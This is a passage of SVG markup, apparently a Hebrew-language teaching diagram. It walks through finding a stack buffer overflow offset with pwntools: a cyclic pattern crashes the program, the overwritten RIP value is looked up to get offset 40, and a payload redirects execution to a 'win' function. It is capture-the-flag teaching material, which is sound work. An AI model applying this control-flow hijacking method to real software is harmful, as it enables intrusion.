<defs><marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="arrhead"/></marker></defs>
<polyline id="edge-0" class="edge" points="151.4,54.0 151.4,94.0" marker-end="url(#arr)"/>
<text class="lbl" x="165.4" y="78.0" text-anchor="end">שולחים דפוס דה-ברוין</text>
<polyline id="edge-1" class="edge" points="151.4,140.0 151.4,180.0" marker-end="url(#arr)"/>
<text class="lbl" x="165.4" y="164.0" text-anchor="end">איזה ערך נחת ב-RIP</text>
<polyline id="edge-2" class="edge" points="151.4,226.0 151.4,266.0" marker-end="url(#arr)"/>
<text class="lbl" x="165.4" y="250.0" text-anchor="end">מזינים את הערך</text>
<polyline id="edge-3" class="edge" points="151.4,304.0 151.4,344.0" marker-end="url(#arr)"/>
<text class="lbl" x="165.4" y="328.0" text-anchor="end">מקבלים offset</text>
<polyline id="edge-4" class="edge" points="151.4,390.0 151.4,430.0" marker-end="url(#arr)"/>
<text class="lbl" x="165.4" y="414.0" text-anchor="end">בונים מטען מדויק</text>
<g id="el-gen">
<rect class="n-code-bg shp" x="25.0" y="16.0" width="252.7" height="38.0" rx="7"/>
<text class="code dyn-gen-0" x="151.4" y="43.0" text-anchor="middle">io.sendline(cyclic(200))</text>
<text class="code dyn-gen-1" x="151.4" y="43.0" text-anchor="middle">aaaabaaacaaadaaa...</text>
</g>
<g id="el-crash">
<rect class="n-box shp" x="68.4" y="94.0" width="166.0" height="46.0" rx="8"/>
<text class="t" x="151.4" y="122.0" text-anchor="middle">התוכנית קורסת</text>
</g>
<g id="el-rip">
<rect class="n-box shp" x="55.6" y="180.0" width="191.5" height="46.0" rx="8"/>
<text class="t dyn-rip-0" x="151.4" y="208.0" text-anchor="middle">ה-RIP נדרס</text>
<text class="t dyn-rip-1" x="151.4" y="208.0" text-anchor="middle" style="direction:ltr">RIP = 0x6161616b</text>
</g>
<g id="el-find">
<rect class="n-code-bg shp" x="29.5" y="266.0" width="243.6" height="38.0" rx="7"/>
<text class="code dyn-find-0" x="151.4" y="293.0" text-anchor="middle">cyclic_find(0x6161616b)</text>
<text class="code dyn-find-1" x="151.4" y="293.0" text-anchor="middle">40</text>
</g>
<g id="el-res">
<rect class="n-box shp" x="63.7" y="344.0" width="175.4" height="46.0" rx="8"/>
<text class="t dyn-res-0" x="151.4" y="372.0" text-anchor="middle">ה-offset ל-RIP</text>
<text class="t dyn-res-1" x="151.4" y="372.0" text-anchor="middle">offset = 40 בתים</text>
</g>
<g id="el-pay">
<rect class="n-code-bg shp" x="16.0" y="430.0" width="270.7" height="38.0" rx="7"/>
<text class="code" x="151.4" y="457.0" text-anchor="middle">flat({40: exe.sym['win']})</text>
</g>
</svg>
